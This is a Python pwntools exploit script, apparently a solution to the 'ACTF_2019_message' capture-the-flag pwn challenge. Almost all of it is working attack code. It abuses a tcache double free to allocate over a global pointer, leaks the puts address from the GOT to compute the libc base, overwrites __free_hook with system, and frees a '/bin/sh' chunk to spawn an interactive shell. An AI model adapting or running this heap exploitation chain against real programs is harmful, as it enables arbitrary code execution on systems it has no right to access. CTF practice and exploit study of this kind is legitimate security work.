from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
 
def ret2libc(leak, func, path=''):
        if path == '':
                libc = LibcSearcher(func, leak)
                base = leak - libc.dump(func)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak - libc.sym[func]
                system = base + libc.sym['system']
                binsh = base + libc.search('/bin/sh').next()
 
        return (system, binsh)
 
s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(delim, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
context.log_level = 'DEBUG'
#binary = './ACTF_2019_message'
#context.binary = binary
elf = ELF('./ACTF_2019_message')
#node4.buuoj.cn:25124	
#p = remote('node4.buuoj.cn',25124)
#name = './ACTF_2019_message'
#ld_so = '/home/giantbranch/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'
#ENV = {"LD_PRELOAD": "./libc-2.27-64.so"}
#p = process([ld_so, name], env=ENV)
p = process('./ACTF_2019_message')
libc = ELF('./libc-2.27.so')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',checksec=False)
 
def dbg():
        gdb.attach(p)
        pause()
 
_add,_free,_edit,_show = 1,2,3,4
def add(size,content='a'):
        sla(':',_add)
        sla(':',size)
        sa(':',content)
 
def free(index):
        sla(':',_free)
        sla(':',index)
 
def edit(index,content):
        sla(':',_edit)
        sla(':',index)
        sa(':',content)
 
def show(index):
        sla(':',_show)
        sla(':',index)
 
# start
add(0x30) # 0
add(0x20) # 1
add(0x20) # 2
free(1)
free(2)
free(1)

gdb.attach(p)
fake = 0x602060+0x8
add(0x20,p64(fake)) # 3 <-> 1
#dbg()
add(0x20) # 4 <-> 2
add(0x20) # 5 <-> 1
#dbg()
#
add(0x20,p64(elf.got['puts'])) # 6 <-> fake

show(0)

ru(': ')
puts = uu64(r(6))
print('puts address:'+hex(puts))

#libc = LibcSearcher('puts', puts)
base = puts - libc.sym['puts']
system = base + libc.sym['system']
free_hook = base + libc.sym['__free_hook']
#print('system address:'+hex(puts))

 
print('system address:'+hex(system))
print('freehook address:'+hex(free_hook))
#dbg() 
edit(6,p64(free_hook))
#dbg()
 
edit(0,p64(system))
#dbg()
add(0x8,'/bin/sh\x00') # 7
free(7)
#free(7)
# end
 
p.interactive()
